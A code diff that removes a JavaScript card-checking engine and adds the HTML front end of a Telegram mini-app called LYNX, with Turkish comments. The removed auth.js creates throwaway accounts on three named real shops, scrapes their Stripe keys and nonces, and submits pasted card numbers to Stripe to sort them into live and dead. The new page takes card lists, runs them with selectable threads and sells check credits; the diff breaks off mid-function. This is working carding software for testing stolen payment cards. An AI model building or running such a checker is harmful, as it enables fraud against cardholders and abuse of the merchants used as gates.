@@ -1,180 +1,967 @@
-// auth.js - Gerçek Stripe Auth Motoru
-// Kullanım: checkCard('516874****|12|26|123')
-
-const AUTH_SITES = [
-    'https://pathosceramiche.com',
-    'https://josephamichael.com',
-    'https://perfectible.net'
-];
-
-function randomStr(n = 8) {
-    const c = 'abcdefghijklmnopqrstuvwxyz';
-    let r = '';
-    for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)];
-    return r;
-}
-
-function randomEmail() { return `user${randomStr(8)}@gmail.com`; }
-
-function uuidv4() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0;
-        const v = c === 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
-    });
-}
-
-function parseCard(input) {
-    const cleaned = input.replace(/\s/g, '');
-    const parts = cleaned.split('|');
-    if (parts.length === 4) {
-        return { pan: parts[0], exp_m: parts[1].padStart(2, '0'), exp_y: parts[2].slice(-2), cvv: parts[3] };
-    }
-    const match = input.match(/(\d{15,19})[\s|/:-]+(\d{1,2})[\s|/:-]+(\d{2,4})[\s|/:-]+(\d{3,4})/);
-    if (match) {
-        return { pan: match[1], exp_m: match[2].padStart(2, '0'), exp_y: match[3].slice(-2), cvv: match[4] };
-    }
-    return null;
-}
-
-async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
-    const ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36';
-    const headers = { 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9' };
-
-    const addPmUrl = baseUrl + '/my-account/add-payment-method/';
-    const email = randomEmail();
-
-    // 1. Register
-    const regPayload = new URLSearchParams({
-        'email': email,
-        'woocommerce-register-nonce': '',
-        '_wp_http_referer': '/my-account/add-payment-method/',
-        'register': 'Register'
-    });
-
-    let html;
-    try {
-        const r1 = await fetch(addPmUrl, { method: 'POST', headers, body: regPayload });
-        html = await r1.text();
-    } catch (e) { throw new Error('Site bağlantı hatası'); }
-
-    // Stripe Key
-    const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
-    if (!keyMatch) throw new Error('Stripe key bulunamadı');
-    const stripeKey = keyMatch[0];
-
-    // Setup Intent Nonce
-    const nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
-    if (!nonceMatch) throw new Error('Setup intent nonce bulunamadı');
-    const setupNonce = nonceMatch[1];
-
-    // 2. Stripe Payment Method
-    const stripePayload = new URLSearchParams({
-        'type': 'card',
-        'card[number]': pan,
-        'card[cvc]': cvv,
-        'card[exp_year]': expY,
-        'card[exp_month]': expM,
-        'allow_redisplay': 'unspecified',
-        'billing_details[address][country]': 'TR',
-        'payment_user_agent': 'stripe.js/09b245ec49; stripe-js-v3/09b245ec49; payment-element; deferred-intent',
-        'referrer': baseUrl,
-        'time_on_page': '35000',
-        'client_attribution_metadata[client_session_id]': uuidv4(),
-        'client_attribution_metadata[merchant_integration_source]': 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-        'client_attribution_metadata[merchant_integration_version]': '2021',
-        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-        'key': stripeKey,
-        '_stripe_version': '2024-06-20'
-    });
-
-    const stripeHeaders = {
-        'User-Agent': ua,
-        'Accept': 'application/json',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/'
-    };
-
-    let pmId;
-    try {
-        const r2 = await fetch('https://api.stripe.com/v1/payment_methods', {
-            method: 'POST',
-            headers: stripeHeaders,
-            body: stripePayload
-        });
-        const json = await r2.json();
-        if (r2.status !== 200) {
-            const err = json.error?.message || 'Stripe hatası';
-            return { status: 'dead', msg: err };
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>LYNX</title>
+    <style>
+        /* ============================================================
+           RESET
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        pmId = json.id;
-        if (!pmId) return { status: 'dead', msg: 'Payment method oluşturulamadı' };
-    } catch (e) { return { status: 'dead', msg: 'Stripe bağlantı hatası' }; }
+        body {
+            background: #0b0d11;
+            color: #d0d5dd;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            user-select: none;
+            -webkit-user-select: none;
+            overflow: hidden;
+            font-weight: 400;
+        }
 
-    // 3. WooCommerce Setup Intent Confirm
-    const wcParams = new URLSearchParams({ 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent' });
-    const wcPayload = new URLSearchParams({
-        'action': 'create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': pmId,
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': setupNonce
+        /* ============================================================
+           F12 KORUMA
+           ============================================================ */
+        #devBlock {
+            position: fixed;
+            inset: 0;
+            background: #0b0d11;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(20px);
+        }
+        #devBlock.active { display: flex; }
+        #devBlock .icon { font-size: 48px; margin-bottom: 12px; }
+        #devBlock h2 { font-size: 20px; color: #ff4757; font-weight: 700; }
+        #devBlock p { color: #4a5260; margin-top: 6px; font-size: 13px; }
+
+        /* ============================================================
+           ÜST BAR
+           ============================================================ */
+        .header {
+            background: #0f1219;
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #1a1f28;
+            flex-shrink: 0;
+            min-height: 54px;
+        }
+        .header .logo {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+        .header .logo span { color: #4a90e2; }
+        .header .user-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .header .user-area .name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #e8edf5;
+        }
+        .header .user-area .credits {
+            background: #1a1f28;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #f9ca24;
+            border: 1px solid #2a3340;
+        }
+        .header .user-area .credits span { color: #fff; }
+
+        /* ============================================================
+           ANA İÇERİK
+           ============================================================ */
+        .main {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px 18px 10px 18px;
+        }
+        .main::-webkit-scrollbar { width: 3px; }
+        .main::-webkit-scrollbar-track { background: #0f1219; }
+        .main::-webkit-scrollbar-thumb { background: #1a1f28; border-radius: 10px; }
+
+        /* ============================================================
+           SAYFALAR
+           ============================================================ */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ============================================================
+           CHECKER SAYFASI (Sade)
+           ============================================================ */
+        .checker-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .checker-sub {
+            font-size: 13px;
+            color: #4a5260;
+            margin-bottom: 14px;
+        }
+
+        .card-textarea {
+            width: 100%;
+            height: 130px;
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 12px;
+            color: #d0d5dd;
+            padding: 12px 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            resize: vertical;
+            outline: none;
+            transition: 0.2s;
+            font-weight: 500;
+            line-height: 1.6;
+        }
+        .card-textarea:focus { border-color: #2a3340; }
+        .card-textarea::placeholder { color: #2a3340; }
+
+        .controls {
+            display: flex;
+            gap: 14px;
+            margin: 12px 0 14px 0;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .controls .gate-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 10px;
+            padding: 4px 12px 4px 16px;
+        }
+        .controls .gate-group label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #4a5260;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .controls .gate-group select {
+            background: transparent;
+            color: #e8edf5;
+            border: none;
+            padding: 6px 0;
+            font-size: 13px;
+            font-weight: 600;
+            outline: none;
+            font-family: inherit;
+            cursor: pointer;
+        }
+        .controls .gate-group select option { background: #0f1219; }
+
+        .thread-group {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 10px;
+            padding: 4px 10px;
+        }
+        .thread-group label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #4a5260;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-right: 4px;
+        }
+        .thread-group .thread-btn {
+            background: transparent;
+            border: none;
+            color: #4a5260;
+            font-weight: 700;
+            font-size: 13px;
+            padding: 4px 8px;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: 0.15s;
+            font-family: inherit;
+        }
+        .thread-group .thread-btn.active {
+            background: #1a73e8;
+            color: #fff;
+        }
+        .thread-group .thread-btn:hover:not(.active) { color: #e8edf5; }
+
+        .start-btn {
+            background: linear-gradient(135deg, #1a73e8, #0d47a1);
+            color: #fff;
+            border: none;
+            padding: 12px 0;
+            border-radius: 12px;
+            font-weight: 800;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            width: 100%;
+            box-shadow: 0 4px 20px #1a73e840;
+            letter-spacing: 0.5px;
+            margin-bottom: 14px;
+        }
+        .start-btn:hover { transform: scale(0.98); opacity: 0.9; }
+        .start-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .stats-grid .stat-box {
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 12px;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .stats-grid .stat-box .num {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+        }
+        .stats-grid .stat-box .label {
+            font-size: 10px;
+            font-weight: 600;
+            color: #4a5260;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+        .stat-box.live .num { color: #00e676; }
+        .stat-box.approved .num { color: #4a90e2; }
+        .stat-box.declined .num { color: #ff5252; }
+
+        /* ============================================================
+           LİVE SONUÇLAR (Overlay değil, doğrudan sayfada)
+           ============================================================ */
+        .live-section {
+            margin-top: 10px;
+        }
+        .live-section .live-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #4a5260;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .live-item {
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 10px;
+            padding: 8px 12px;
+            margin-bottom: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .live-item .cc { font-weight: 700; }
+        .live-item .cc.live { color: #00e676; }
+        .live-item .cc.dead { color: #ff5252; }
+        .live-item .result {
+            color: #4a5260;
+            font-size: 11px;
+            max-width: 45%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .live-item .copy-btn {
+            background: #1a1f28;
+            border: none;
+            color: #4a5260;
+            padding: 2px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .live-item .copy-btn:hover { color: #e8edf5; }
+        .live-empty {
+            text-align: center;
+            color: #2a3340;
+            padding: 20px 0;
+            font-size: 14px;
+        }
+
+        /* ============================================================
+           PROFİL SAYFASI (Kredi paketleri burada)
+           ============================================================ */
+        .profile-card {
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 16px;
+            padding: 24px 20px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .profile-card .avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #1a1f28;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+            margin: 0 auto 10px auto;
+            border: 2px solid #2a3340;
+            overflow: hidden;
+        }
+        .profile-card .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .profile-card .pname { font-size: 18px; font-weight: 700; color: #e8edf5; }
+        .profile-card .pusername { font-size: 13px; color: #4a5260; margin: 2px 0 12px 0; }
+        .profile-card .pstats {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 16px 0 20px 0;
+        }
+        .profile-card .pstats div { text-align: center; }
+        .profile-card .pstats .num { font-size: 20px; font-weight: 800; color: #e8edf5; }
+        .profile-card .pstats .label { font-size: 10px; color: #4a5260; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* Kredi paketleri */
+        .credit-packs {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 16px 0 20px 0;
+        }
+        .credit-pack {
+            background: #0f1219;
+            border: 1px solid #1a1f28;
+            border-radius: 12px;
+            padding: 14px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .credit-pack:hover { border-color: #2a3340; transform: scale(0.96); }
+        .credit-pack .price {
+            font-size: 20px;
+            font-weight: 800;
+            color: #f9ca24;
+        }
+        .credit-pack .price small {
+            font-size: 11px;
+            color: #4a5260;
+            font-weight: 400;
+        }
+        .credit-pack .desc {
+            font-size: 12px;
+            color: #4a5260;
+            font-weight: 500;
+            margin-top: 2px;
+        }
+        .credit-pack .badge {
+            font-size: 9px;
+            font-weight: 700;
+            background: #1a73e8;
+            color: #fff;
+            padding: 1px 10px;
+            border-radius: 12px;
+            display: inline-block;
+            margin-top: 4px;
+            text-transform: uppercase;
+        }
+        .credit-pack .badge.popular { background: #f9ca24; color: #0b0d11; }
+        .credit-pack .badge.best { background: #ff6b6b; color: #fff; }
+
+        .profile-card .logout-btn {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            padding: 10px 40px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .profile-card .logout-btn:hover { background: #b71c1c; }
+
+        /* ============================================================
+           AYARLAR SAYFASI
+           ============================================================ */
+        .settings-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 0;
+            border-bottom: 1px solid #12171f;
+        }
+        .settings-item .left { display: flex; align-items: center; gap: 12px; }
+        .settings-item .left .icon { font-size: 18px; color: #4a5260; }
+        .settings-item .left .text .title { font-size: 14px; font-weight: 600; color: #e8edf5; }
+        .settings-item .left .text .sub { font-size: 12px; color: #4a5260; }
+        .settings-item .right { color: #4a5260; font-size: 13px; }
+
+        /* ============================================================
+           ALT NAV
+           ============================================================ */
+        .bottom-nav {
+            background: #0f1219;
+            border-top: 1px solid #1a1f28;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0 12px 0;
+            flex-shrink: 0;
+        }
+        .bottom-nav .nav-item {
+            background: none;
+            border: none;
+            color: #4a5260;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            font-size: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 16px;
+            transition: 0.2s;
+            font-family: inherit;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .bottom-nav .nav-item .icon { font-size: 22px; line-height: 1; }
+        .bottom-nav .nav-item.active { color: #e8edf5; }
+
+        /* ============================================================
+           TOAST
+           ============================================================ */
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1f28;
+            color: #e8edf5;
+            padding: 10px 24px;
+            border-radius: 12px;
+            border: 1px solid #2a3340;
+            font-size: 13px;
+            font-weight: 600;
+            z-index: 99999;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+            box-shadow: 0 8px 32px #00000080;
+        }
+        .toast.show { opacity: 1; }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 480px) {
+            .header .logo { font-size: 17px; }
+            .header .user-area .name { font-size: 12px; }
+            .header .user-area .credits { font-size: 11px; padding: 2px 10px; }
+            .controls { flex-direction: column; align-items: stretch; gap: 8px; }
+            .credit-packs { grid-template-columns: 1fr 1fr; }
+            .stats-grid { grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
+            .stats-grid .stat-box .num { font-size: 18px; }
+            .card-textarea { height: 100px; }
+        }
+        @media (max-width: 380px) {
+            .credit-packs { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== F12 KORUMA ===== -->
+<div id="devBlock">
+    <div class="icon">🛡️</div>
+    <h2>Developer Tools Devre Dışı</h2>
+    <p>Bu uygulama F12 veya sağ tık ile açılamaz.</p>
+</div>
+
+<!-- ===== TOAST ===== -->
+<div class="toast" id="toast"></div>
+
+<!-- ===== ÜST BAR ===== -->
+<div class="header">
+    <div class="logo">LYNX</div>
+    <div class="user-area">
+        <span class="name" id="userName">Kullanıcı</span>
+        <span class="credits">⭐ <span id="creditDisplay">0</span></span>
+    </div>
+</div>
+
+<!-- ===== ANA İÇERİK ===== -->
+<div class="main" id="mainContent">
+
+    <!-- ===== CHECKER SAYFASI ===== -->
+    <div class="page active" id="pageChecker">
+        <div class="checker-title">Checker</div>
+        <div class="checker-sub">Paste cards, pick a gate, go.</div>
+
+        <textarea class="card-textarea" id="cardInput" placeholder="4111111111111111 | 12 | 2025 | 123&#10;5200000000000000 | 06 | 2026 | 456"></textarea>
+
+        <div class="controls">
+            <div class="gate-group">
+                <label>Gate</label>
+                <select id="gateSelect">
+                    <option value="stripe">Stripe Auth FREE</option>
+                    <option value="adyen" disabled>Adyen (Yakında)</option>
+                </select>
+            </div>
+            <div class="thread-group">
+                <label>Threads</label>
+                <button class="thread-btn active" data-thread="1">1</button>
+                <button class="thread-btn" data-thread="3">3</button>
+                <button class="thread-btn" data-thread="5">5</button>
+                <button class="thread-btn" data-thread="10">10</button>
+                <button class="thread-btn" data-thread="15">15</button>
+            </div>
+        </div>
+
+        <button class="start-btn" id="startBtn">▶ Start</button>
+
+        <div class="stats-grid">
+            <div class="stat-box live"><div class="num" id="liveCount">0</div><div class="label">Live</div></div>
+            <div class="stat-box approved"><div class="num" id="approvedCount">0</div><div class="label">Approved</div></div>
+            <div class="stat-box declined"><div class="num" id="declinedCount">0</div><div class="label">Declined</div></div>
+        </div>
+
+        <!-- Live sonuçlar burada listelenecek -->
+        <div class="live-section">
+            <div class="live-title">📡 Live Results</div>
+            <div id="liveList">
+                <div class="live-empty">No live results</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== PROFİL SAYFASI ===== -->
+    <div class="page" id="pageProfile">
+        <div class="profile-card">
+            <div class="avatar" id="profileAvatar">👤</div>
+            <div class="pname" id="profileName">Kullanıcı</div>
+            <div class="pusername" id="profileUsername">@?</div>
+            <div class="pstats">
+                <div><div class="num" id="pCredits">0</div><div class="label">Credits</div></div>
+                <div><div class="num" id="pLive">0</div><div class="label">Live</div></div>
+                <div><div class="num" id="pChecked">0</div><div class="label">Checked</div></div>
+            </div>
+
+            <div style="font-size:13px; font-weight:600; color:#4a5260; text-transform:uppercase; letter-spacing:0.5px; margin:8px 0 10px 0;">Buy Credits</div>
+            <div class="credit-packs">
+                <div class="credit-pack" data-credits="100" data-stars="10">
+                    <div class="price">100 ⭐</div>
+                    <div class="desc">100 credits</div>
+                    <span class="badge popular">POPULAR</span>
+                </div>
+                <div class="credit-pack" data-credits="320" data-stars="30">
+                    <div class="price">320 ⭐</div>
+                    <div class="desc">320 credits</div>
+                    <span class="badge best">BEST</span>
+                </div>
+                <div class="credit-pack" data-credits="540" data-stars="50">
+                    <div class="price">540 ⭐</div>
+                    <div class="desc">540 credits</div>
+                </div>
+                <div class="credit-pack" data-credits="760" data-stars="70">
+                    <div class="price">760 ⭐</div>
+                    <div class="desc">760 credits</div>
+                </div>
+            </div>
+
+            <button class="logout-btn" id="logoutBtn">🚪 Logout</button>
+        </div>
+    </div>
+
+    <!-- ===== AYARLAR SAYFASI ===== -->
+    <div class="page" id="pageSettings">
+        <div style="font-size:22px; font-weight:700; color:#fff; margin:8px 0 16px 0;">Settings</div>
+        <div class="settings-item">
+            <div class="left"><span class="icon">👤</span><div class="text"><div class="title">Account</div><div class="sub" id="settingsUser">Kullanıcı</div></div></div>
+            <div class="right" id="settingsCredits">0 credits</div>
+        </div>
+        <div class="settings-item">
+            <div class="left"><span class="icon">📢</span><div class="text"><div class="title">Channel</div><div class="sub">Join our channel</div></div></div>
+            <div class="right">></div>
+        </div>
+        <div class="settings-item">
+            <div class="left"><span class="icon">📊</span><div class="text"><div class="title">Hits</div><div class="sub">View hit statistics</div></div></div>
+            <div class="right">></div>
+        </div>
+        <div class="settings-item">
+            <div class="left"><span class="icon">❓</span><div class="text"><div class="title">Support</div><div class="sub">Get help</div></div></div>
+            <div class="right">></div>
+        </div>
+        <div class="settings-item">
+            <div class="left"><span class="icon">📌</span><div class="text"><div class="title">Version</div><div class="sub">1.0.0</div></div></div>
+            <div class="right"></div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== ALT NAV ===== -->
+<div class="bottom-nav">
+    <button class="nav-item active" data-page="pageChecker">
+        <span class="icon">📋</span>
+        <span>Checker</span>
+    </button>
+    <button class="nav-item" data-page="pageProfile">
+        <span class="icon">👤</span>
+        <span>Profile</span>
+    </button>
+    <button class="nav-item" data-page="pageSettings">
+        <span class="icon">⚙️</span>
+        <span>Settings</span>
+    </button>
+</div>
+
+<!-- ============================================================
+     JAVASCRIPT (Sade, Sağlam, Çalışır)
+     ============================================================ -->
+<script>
+// ============================================================
+//  F12 KORUMA
+// ============================================================
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
+        e.preventDefault();
+        document.getElementById('devBlock').classList.add('active');
+        return false;
+    }
+});
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+
+// ============================================================
+//  TELEGRAM KULLANICI
+// ============================================================
+let tgUser = { id: '123456789', username: 'test_user', first_name: 'Justin', last_name: 'F.' };
+try {
+    if (window.Telegram && Telegram.WebApp) {
+        const initData = Telegram.WebApp.initDataUnsafe;
+        if (initData && initData.user) {
+            tgUser = initData.user;
+        }
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+    }
+} catch(e) {}
+
+// ============================================================
+//  DOM REF
+// ============================================================
+const $ = id => document.getElementById(id);
+const userName = $('userName');
+const creditDisplay = $('creditDisplay');
+const cardInput = $('cardInput');
+const gateSelect = $('gateSelect');
+const startBtn = $('startBtn');
+const liveCount = $('liveCount');
+const approvedCount = $('approvedCount');
+const declinedCount = $('declinedCount');
+const liveList = $('liveList');
+const toast = $('toast');
+const profileName = $('profileName');
+const profileUsername = $('profileUsername');
+const profileAvatar = $('profileAvatar');
+const pCredits = $('pCredits');
+const pLive = $('pLive');
+const pChecked = $('pChecked');
+const settingsUser = $('settingsUser');
+const settingsCredits = $('settingsCredits');
+
+// ============================================================
+//  STATE
+// ============================================================
+let credits = 100;
+let liveResults = [];
+let totalChecked = 0;
+let isRunning = false;
+let selectedThread = 1;
+let live = 0;
+let approved = 0;
+let declined = 0;
+
+// ============================================================
+//  KULLANICI BİLGİLERİ
+// ============================================================
+const fullName = (tgUser.first_name || '') + (tgUser.last_name ? ' ' + tgUser.last_name : '') || tgUser.username || 'Kullanıcı';
+userName.textContent = fullName;
+profileName.textContent = fullName;
+profileUsername.textContent = '@' + (tgUser.username || 'unknown');
+settingsUser.textContent = fullName;
+
+if (tgUser.photo_url) {
+    profileAvatar.innerHTML = `<img src="${tgUser.photo_url}" style="width:100%;height:100%;object-fit:cover;">`;
+} else {
+    profileAvatar.textContent = (tgUser.first_name || 'U')[0].toUpperCase();
+}
+
+// ============================================================
+//  KREDİ GÜNCELLEME
+// ============================================================
+function updateCreditsUI() {
+    creditDisplay.textContent = credits;
+    pCredits.textContent = credits;
+    settingsCredits.textContent = credits + ' credits';
+}
+
+// ============================================================
+//  THREAD SEÇİMİ
+// ============================================================
+document.querySelectorAll('.thread-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        document.querySelectorAll('.thread-btn').forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        selectedThread = parseInt(this.dataset.thread);
     });
+});
 
-    const wcHeaders = {
-        'User-Agent': ua,
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'x-requested-with': 'XMLHttpRequest',
-        'origin': baseUrl,
-        'referer': addPmUrl
-    };
+// ============================================================
+//  KREDİ PAKETLERİ (Telegram Stars)
+// ============================================================
+document.querySelectorAll('.credit-pack').forEach(pack => {
+    pack.addEventListener('click', function() {
+        const creditsAmount = parseInt(this.dataset.credits);
+        const starsAmount = parseInt(this.dataset.stars);
+        showToast('📤 Yıldız gönderimi için yönlendiriliyor...');
 
-    try {
-        const r3 = await fetch(baseUrl + '?' + wcParams.toString(), {
-            method: 'POST',
-            headers: wcHeaders,
-            body: wcPayload
-        });
-        const json = await r3.json();
-        if (json.success === true) {
-            return { status: 'live', msg: '✅ Approved - Stripe Auth Success!' };
+        if (window.Telegram && Telegram.WebApp) {
+            Telegram.WebApp.openInvoice('https://t.me/send?start=stars_' + starsAmount);
         } else {
-            const errMsg = json.data?.error?.message || json.data?.message || 'Setup Intent Failed';
-            return { status: 'dead', msg: '❌ ' + errMsg };
+            window.open(`https://t.me/Anxietyss?start=stars_${starsAmount}`, '_blank');
         }
-    } catch (e) {
-        return { status: 'dead', msg: '❌ WooCommerce bağlantı hatası' };
-    }
-}
+        // Demo: kredi ekle (gerçekte ödeme sonrası gelecek)
+        credits += creditsAmount;
+        updateCreditsUI();
+        showToast(`✅ ${creditsAmount} kredi eklendi! Yeni bakiye: ${credits}`);
+    });
+});
 
-async function checkCard(cardInput) {
-    const parsed = parseCard(cardInput);
-    if (!parsed) return '❌ Format hatası: Kart | Ay | Yıl | CVV';
-
-    const { pan, exp_m, exp_y, cvv } = parsed;
-    const cleanCard = `${pan}|${exp_m}|${exp_y}|${cvv}`;
-
-    const sites = [...AUTH_SITES];
-    for (let i = sites.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [sites[i], sites[j]] = [sites[j], sites[i]];
-    }
-
-    for (const site of sites) {
-        try {
-            const result = await checkCardOnSite(site, pan, exp_m, exp_y, cvv);
-            if (result.status === 'live') {
-                return `✅ LIVE: ${cleanCard} - ${result.msg}`;
-            } else {
-                return `❌ DEAD: ${cleanCard} - ${result.msg}`;
-            }
-        } catch (e) {
-            continue;
+// ============================================================
+//  KARTLARI OKU
+// ============================================================
+function getCardsFromInput() {
+    const text = cardInput.value;
+    const lines = text.split('\n').filter(l => l.trim() !== '');
+    const cards = [];
+    lines.forEach(line => {
+        const clean = line.trim();
+        if (clean.match(/\d{15,19}[\s|/:-]+\d{1,2}[\s|/:-]+\d{2,4}[\s|/:-]+\d{3,4}/)) {
+            cards.push(clean);
         }
-    }
-    return `⚠️ HATA: ${cleanCard} - Tüm siteler başarısız`;
+    });
+    return cards;
 }
 
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = { checkCard };
+// ============================================================
+//  LİVE LİSTESİ RENDER
+// ============================================================
+function renderLiveList() {
+    liveList.innerHTML = '';
+    if (liveResults.length === 0) {
+        liveList.innerHTML = '<div class="live-empty">No live results</div>';
+        return;
+    }
+    liveResults.forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'live-item';
+        const isLive = item.result.includes('Approved');
+        div.innerHTML = `
+            <span class="cc ${isLive ? 'live' : 'dead'}">${item.card}</span>
+            <span class="result">${item.result}</span>
+            <button class="copy-btn" data-card="${item.card}">📋</button>
+        `;
+        liveList.appendChild(div);
+    });
+    // Kopyala
+    document.querySelectorAll('.live-item .copy-btn').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            const card = this.dataset.card;
+            navigator.clipboard.writeText(card).then(() => showToast('✅ Kopyalandı: ' + card));
+        });
+    });
 }
+
+// ============================================================
+//  STATS GÜNCELLE
+// ============================================================
+function updateStatsUI() {
+    liveCount.textContent = live;
+    approvedCount.textContent = approved;
+    declinedCount.textContent = declined;
+    pLive.textContent = live;
+    pChecked.textContent = totalChecked;
+}
+
+// ============================================================
+//  START - GERÇEK KONTROL (auth.js ile entegre)
+// ============================================================
+startBtn.addEventListener('click', function() {
+    if (isRunning) return;
+    const cards = getCardsFromInput();
+    if (cards.length === 0) {
+        showToast('⚠️ Lütfen en az bir kart girin.');
+        return;
+    }
+    if (credits <= 0) {
+        showToast('⚠️ Yeterli kredi yok! Profile\'dan satın al.');
+        return;
+    }
+
+    const toCheck = Math.min(cards.length, credits);
+    if (toCheck < cards.length) {
+        showToast(`⚠️ Sadece ${toCheck} kart kontrol edilebilir. Kredi yetersiz.`);
+    }
+
+    isRunning = true;
+    startBtn.textContent = '⏳ Checking...';
+    startBtn.disabled = true;
+
+    let processed = 0;
+    live = 0;
+    approved = 0;
+    declined = 0;
+    liveResults = [];
+
+    // Thread chunk işleme
+    const chunkSize = selectedThread;
+    const chunks = [];
+    for (let i = 0; i < toCheck; i += chunkSize) {
+        chunks.push(cards.slice(i, i + chunkSize));
+    }
+
+    let chunkIndex = 0;
+    function processNextChunk() {
